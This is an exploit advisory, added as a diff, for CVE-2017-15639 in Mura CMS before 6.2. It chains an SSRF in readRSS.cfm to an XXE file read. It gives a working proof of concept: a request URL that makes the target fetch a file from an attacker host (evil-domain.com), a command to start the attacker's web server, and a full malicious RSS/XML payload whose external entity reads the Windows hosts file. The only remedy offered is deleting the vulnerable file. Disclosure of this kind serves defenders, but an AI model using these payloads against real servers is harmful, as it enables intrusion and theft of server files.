@@ -1,0 +1,57 @@
+# Exploit Title: Mura CMS before 6.2 SSRF + XXE
+# Date: 30-10-2017
+# Exploit Author: Anthony Cole
+# Vendor Homepage: http://www.getmura.com/
+# Version: before 6.2
+# Contact: http://twitter.com/acole76
+# Website: http://twitter.com/acole76
+# Tested on: Windows 2008 w/ Coldfusion 8
+# CVE: CVE-2017-15639
+# Category: webapps
+ 
+1. Description
+   
+Any user can cause Mura CMS before version 6.2 to make a http request.  As an added bonus, the response from that HTTP GET request is passed directly to XmlParse().  It is possible to read a file from the file system using an XXE attack.
+ 
+   
+2. Proof of Concept
+
+vulnerable file is on github, line 50:
+https://github.com/blueriver/MuraCMS/blob/c8753ce80373eca302c6d9d8a02ff63a1d308991/tasks/feed/readRSS.cfm
+ 
+http://www.target.tld/tasks/feed/readRSS.cfm?siteid=SITENAMEHERE&rssurl=http://evil-domain.com/file.xml&MAXRSSITEMS=500
+
+Explanation of params
+	siteid - The siteid can be obtained by viewing the html source code of the target home page and searching "siteid".
+	rssurl - This is the URL you want Mura CMS to call out to.
+	
+To perform a XXE attack, you will need to stand up a web server: python -m SimpleHTTPServer 80
+	
+Then create a file:
+
+<?xml version="1.0" ?>
+<!DOCTYPE rss [
+        <!ENTITY send SYSTEM "file:///c:\Windows\System32\drivers\etc\hosts">
+]>
+
+<rss version="2.0">
+<channel>
+        <title>title</title>
+        <link>link</link>
+        <description>description</description>
+        <generator>http://www.getmura.com</generator>
+        <pubDate>Thu, 28 Sep 2018 11:55:19 -0700</pubDate>
+        <language>en-us</language>
+        <item>
+                <title>Item title</title>
+                <link>http://host/</link>
+                <guid isPermaLink="false">00000000-0000-0000-0000000000000000</guid>
+                <pubDate>Thu, 21 Sep 2018 00:00:01 -0700</pubDate>
+                <description>&send;</description>
+        </item>
+</channel>
+</rss>
+   
+3. Solution:
+
+delete readRSS.cfm from the server.
